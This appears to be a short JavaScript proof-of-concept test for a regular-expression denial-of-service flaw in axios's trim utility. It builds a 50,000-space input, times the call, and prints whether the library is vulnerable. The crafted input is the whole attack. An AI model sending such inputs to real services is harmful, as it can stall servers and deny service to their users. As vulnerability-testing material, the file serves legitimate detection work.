function build_blank(n) {
  var ret = "1";
  for (var i = 0; i < n; i++) {
    ret += " ";
  }
  return ret + "1";
}
// test("ReDoS in axios", () => {
  const { trim } = require("axios/lib/utils");
  const measureTime = require("../utils").measureTime;
  let t = measureTime(function () {
    trim(build_blank(50000));
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
